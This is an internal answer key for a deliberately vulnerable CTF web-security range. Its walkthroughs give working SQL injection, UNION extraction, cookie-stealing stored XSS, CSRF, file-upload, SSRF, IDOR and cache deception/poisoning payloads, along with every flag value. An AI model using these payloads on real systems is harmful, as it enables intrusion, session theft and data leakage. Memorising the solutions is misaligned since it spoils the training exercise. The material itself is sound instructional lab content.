# CSZone Backend Range — Internal Solutions Guide (Phase 1)

**Confidential — do not distribute to participants.** Companion to
`ctf-platform/SOLUTIONS-INTERNAL.md` (the static frontend range). This
covers the 9 backend-driven flags added 2026-07-24.

All 9 verified end-to-end against a live instance via `verify_all.py` —
every flag below was actually extracted by the script, not just designed
on paper. Run it yourself after any future code change to this app.

---

## B1 — Legacy Admin SQLi Auth Bypass
- **Category:** SQL Injection | **Difficulty:** Medium
- **Story:** "There's an old admin portal at `/legacy-admin/login` that
  predates the current auth system. It was marked for decommission in
  2023 and never was."
- **Where vulnerable:** `/legacy-admin/login` builds its query via raw
  string concatenation against `legacy_admin_creds` — the only query in
  the codebase built this way.
- **Flag:** `CTF{st0r3d_c00k13_th3ft}` — delivered as an `admin_session_flag`
  cookie (deliberately non-HttpOnly) on successful bypass. This flag
  formally belongs to the Stored XSS chain (B3) — reaching admin here is
  step one of that chain, not a flag in its own right. Getting admin
  access itself is the real milestone of this challenge.
- **Walkthrough:** Submit username `admin' OR '1'='1' -- -` with any
  password → query becomes always-true → logs in as admin → redirected
  to `/admin/inbox`.
- **Tools:** Browser or `curl -d "username=admin' OR '1'='1' -- -&password=x"`.

---

## B2 — UNION-Based Extraction
- **Category:** SQL Injection | **Difficulty:** Medium/Hard
- **Story:** "There's a public employee directory search. It doesn't
  require login."
- **Where vulnerable:** `/directory?q=` — raw string-built `LIKE` query
  against `employees` (3 columns: name, department, email).
- **Flag:** `CTF{un10n_s3l3ct_m4st3r}`, sitting in a separate `flags`
  table, unreachable through the app's normal UI.
- **Walkthrough:**
  1. Confirm injectability: `q=test' OR '1'='1` returns all employees.
  2. Confirm column count (3) — already known from the visible table, or
     confirm via `ORDER BY 3--` / `ORDER BY 4--` (the latter errors).
  3. Extract: `q=nonexistent' UNION SELECT label, 'flags-table', value FROM flags -- -`
- **Tools:** Browser address bar, Burp Repeater, or `curl -G`.
- **Calibration note:** column count is discoverable without blind
  techniques since the table structure is visible in the UI — keeps this
  at Medium rather than Hard. To raise difficulty later, hide the column
  labels or require `ORDER BY` enumeration first.

---

## B3 — Stored XSS → Session Cookie Theft (chained)
- **Category:** Cross-Site Scripting | **Difficulty:** Hard (chains B1)
- **Story:** "The guestbook is public and unmoderated. There's also an
  internal review inbox that reads the same data."
- **Where vulnerable:** `/guestbook` message field is rendered with
  Jinja2's `|safe` filter — the one deliberately unescaped output in the
  app. `/admin/inbox` renders the exact same data the same way.
- **Flag:** `CTF{st0r3d_c00k13_th3ft}`
- **Walkthrough:**
  1. Post to the public guestbook (no login needed):
     `<img src=x onerror="fetch('/xss/collect?c='+encodeURIComponent(document.cookie))">`
  2. Get admin access via B1 (SQLi bypass at `/legacy-admin/login`) — this
     sets the `admin_session_flag` cookie in your own browser.
  3. Visit `/admin/inbox` as admin — the stored payload from step 1
     executes in this authenticated context and beacons your own
     `admin_session_flag` cookie value to `/xss/collect`.
  4. Check `/xss/collect/log` to see the captured cookie value, which
     contains the flag.
- **Tools:** Browser (steps 1, 2, 3 need real script execution — this is
  not simulated). `curl`/Burp for `/xss/collect/log`.
- **Design note:** single-player-friendly by design — the same
  participant plays "attacker" (step 1, anonymous) and "victim" (steps
  2-3, admin), which is a completely standard pattern for solo web
  security labs (matches how the cache deception challenge, B8, also
  works). No headless-browser bot was built to simulate a "real" admin
  visiting independently — see the backend README for why, and treat
  adding one as a stretch goal for a future phase if you want the
  challenge to require exploiting an NPC-like victim rather than
  yourself.

---

## B4 — CSRF: Forged Email Change
- **Category:** CSRF | **Difficulty:** Medium
- **Story:** "The account settings page lets you change your email.
  Nothing about the request looks unusual."
- **Where vulnerable:** `POST /account/email` — session-cookie
  authenticated, no CSRF token, no Origin/Referer check.
- **Flag:** `CTF{csrf_n0_t0k3n_pwn3d}`, revealed once the email is
  successfully changed to anything ending `@attacker-controlled.test`
  (this suffix is just how the challenge verifies success — any
  attacker-chosen address would work in a real attack).
- **Walkthrough:** Log in normally, then open
  `participant-tools/csrf-poc-change-email.html` from a **different
  origin** (a different port counts) while still logged in. The
  auto-submitting form fires a cross-site POST that carries your session
  cookie, silently changing your email.
- **Tools:** Any static file server on a different port for the PoC page,
  or Burp's CSRF PoC generator.
- **Hosting caveat:** the app sets `SameSite=None` on its session cookie
  so the forged cross-site POST actually carries the cookie. Modern
  browsers require `Secure=True` to honor `SameSite=None` — **this only
  works reliably over HTTPS.** Over plain HTTP (e.g. local testing),
  some browsers will silently drop the cookie on the cross-site request
  and the PoC will appear to fail even though the endpoint itself is
  still vulnerable. Deploy over HTTPS for a reliable participant-facing
  demo, or verify server-side (as `verify_all.py` does) when testing
  locally over HTTP.

---

## B5 — Unrestricted File Upload → Stored XSS
- **Category:** File Upload | **Difficulty:** Medium
- **Story:** "Avatar upload blocks the obvious stuff — `.php`, `.py`,
  `.exe`, `.sh`, `.jsp`, `.asp`/`.aspx`. Nothing else."
- **Where vulnerable:** `/upload` uses a blocklist, not an allowlist.
  `.html`, `.htm`, and `.svg` all pass through untouched, then get served
  from the same origin at `/static/uploads/<filename>` with a real
  `text/html` (or `image/svg+xml`) content-type.
- **Flag:** none extracted directly here — the point of this challenge is
  demonstrating the primitive (same-origin script execution via a file
  the app itself served). Chain it: an uploaded HTML file's JS runs with
  full access to the app's origin, so it can read non-HttpOnly cookies
  or hit authenticated endpoints exactly like the guestbook payload in
  B3 does. Treat this as "B3's delivery mechanism, demonstrated as its
  own primitive" rather than a separately flagged challenge — no
  standalone flag was assigned to avoid rewarding the same underlying
  bug twice under two different names.
- **Walkthrough:** Upload a file named `pwn.html` containing
  `<script>document.write(document.cookie)</script>` → visit
  `/static/uploads/pwn.html` → script executes in the app's origin.
- **Tools:** Browser, `curl -F "file=@pwn.html"`.
- **Calibration note:** if you want this to carry its own flag rather
  than being folded into B3, the clean way is to add a second
  non-HttpOnly cookie set only for the file-upload feature (e.g.
  `upload_widget_token`) so the two challenges don't share a flag or a
  narrative — flagged here as a decision for you to make before running
  this with participants, not resolved in this build.

---

## B6 — SSRF: Internal Metadata Endpoint
- **Category:** SSRF | **Difficulty:** Medium/Hard
- **Story:** "You can import an avatar from a URL. The server fetches it
  for you."
- **Where vulnerable:** `/avatar-import` — `requests.get(url)` server-side
  with no allowlist, no scheme restriction, no check against internal or
  loopback addresses.
- **Where the flag lives:** `/internal/metadata` — gated only by
  `request.remote_addr in ("127.0.0.1", "::1")`, simulating a
  cloud-metadata-service-style internal endpoint.
- **Flag:** `CTF{ssrf_1nt3rn4l_m3t4d4t4}`
- **Walkthrough:** Log in, go to `/avatar-import`, submit URL
  `http://localhost:5000/internal/metadata` (or whatever host:port the
  app is actually running on — from the SERVER's own perspective, not
  the participant's browser) → the fetched content (shown back on the
  page) contains the flag.
- **Tools:** Browser, Burp.
- **Deployment note:** if deployed behind a reverse proxy or in Docker,
  `localhost`/`127.0.0.1` inside the container refers to the container
  itself, which is exactly the point — make sure participants understand
  they're targeting the SERVER's loopback, not their own machine's.

---

## B7 — Backend IDOR
- **Category:** Broken Access Control | **Difficulty:** Easy/Medium
- **Story:** "Your orders page shows an order ID in the URL."
- **Where vulnerable:** `/orders/<id>` — no check that the order's
  `user_id` matches the logged-in session's user id.
- **Flag:** `CTF{b4ck3nd_1d0r_r34l}`, in order #2's notes field (belongs
  to `finance_bot`, not the participant).
- **Walkthrough:** Log in as any registered user (order #1 is yours),
  then visit `/orders/2` directly.
- **Tools:** Browser, changing the URL manually.
- **Contrast note:** the `/orders` list view itself is NOT vulnerable —
  it correctly filters `WHERE user_id = ?`. Only the detail view lacks
  the check. This is intentional: real IDOR findings are often exactly
  this — one endpoint out of several doing the right thing everywhere
  except one place.

---

## B8 — Cache Deception
- **Category:** Cache Vulnerabilities | **Difficulty:** Hard
- **Story:** "There's a route `/account/profile/<anything>` that was
  added for 'future SPA asset routing' and never scoped down."
- **Where vulnerable:** two independent bugs that combine:
  1. `/account/profile/<path:extra>` renders the exact same authenticated,
     personalized profile as `/account`, regardless of `extra`.
  2. The shared cache layer treats any path ending in
     `.css/.js/.jpg/.jpeg/.png/.gif/.ico` as a universally-cacheable
     static asset — caching the FULL response body, personalized data
     included, keyed only by path (no auth state, no cookie, in the key).
- **Flag:** `CTF{c4ch3_d3c3pt10n_l34k}`, in the `participant` account's
  `personal_note` field.
- **Walkthrough:**
  1. Log in as `participant` (or your own registered account) and visit
     `/account/profile/legacy-theme.css` — a URL that looks like a
     stylesheet request. You get your real, personalized profile back
     (including your private note), because the routing bug doesn't
     care about the `extra` path segment.
  2. That response is now cached, keyed by that exact path.
  3. Make a completely unauthenticated request (curl with no cookies, or
     a private browser window) to the exact same URL,
     `/account/profile/legacy-theme.css` → you get the cached response
     back, containing the personalized data from step 1, with no
     authentication at all. Response carries `X-Cache: HIT`.
- **Tools:** Browser + curl/incognito to demonstrate the two different
  "identities" hitting the same cached path.
- **Design note:** implemented single-account-friendly — you poison the
  cache with your own data, then prove an unauthenticated request can
  retrieve it. This teaches the core lesson (the cache doesn't enforce
  auth) without requiring a separate victim account, matching the same
  pattern used in B3.

---

## B9 — Cache Poisoning
- **Category:** Cache Vulnerabilities | **Difficulty:** Hard
- **Story:** "The partner promo banner page is treated as static for
  performance — same content for everyone."
- **Where vulnerable:** `/promo/partner-banner` reflects the
  `X-Forwarded-Host` header (falling back to `Host`) into a canonical
  link, and this header is **unkeyed** — the cache stores/serves by path
  only, so whichever request wins the cache slot dictates what every
  subsequent visitor sees for the TTL window (5 minutes).
- **Flag:** none extracted directly — this challenge is graded on
  demonstrating impact, matching how cache poisoning findings are
  reported in real VAPT engagements (PoC = "here's the injected marker,
  here's proof a second, unrelated client received it"), not on a hidden
  string. If you want a scorable flag here, the clean fix is the same
  pattern as B5 — add a specific marker string requirement and a
  verification route. Not done in this build; noted as a decision point.
- **Walkthrough:**
  1. Send `GET /promo/partner-banner` with header
     `X-Forwarded-Host: evil-attacker-domain.test`.
  2. Send a second, completely clean `GET /promo/partner-banner` with no
     special headers (simulating a different, unrelated visitor).
  3. Confirm the second response still contains
     `evil-attacker-domain.test` and carries `X-Cache: HIT` — proving the
     poisoned response, not a fresh one, was served.
- **Tools:** `curl -H "X-Forwarded-Host: evil-attacker-domain.test"`,
  Burp Repeater.

---

## Open design decisions for you to make before running this live

1. **B5 and B9 have no standalone flag** (see notes above) — decide
   whether to add dedicated flags/markers for them, or keep them as
   "prove the impact" challenges scored manually/by screenshot, which is
   arguably more realistic training for how these bug classes get
   reported in real engagements.
2. **B3's admin-bot** is self-triggered (you play both roles). A future
   enhancement would be a real headless-browser bot (Playwright) that
   periodically visits `/admin/inbox` on its own, independent of the
   participant, so the challenge requires exploiting a genuinely separate
   party. Not built here — Playwright needs browser binaries that
   weren't installable in the sandbox this was built in; this is
   entirely feasible on your own machine or CI environment.
3. **Difficulty labels above are first-pass estimates** — recalibrate
   after running this with an actual junior-level cohort, same as the
   note already in the frontend solutions doc for B2/E3.
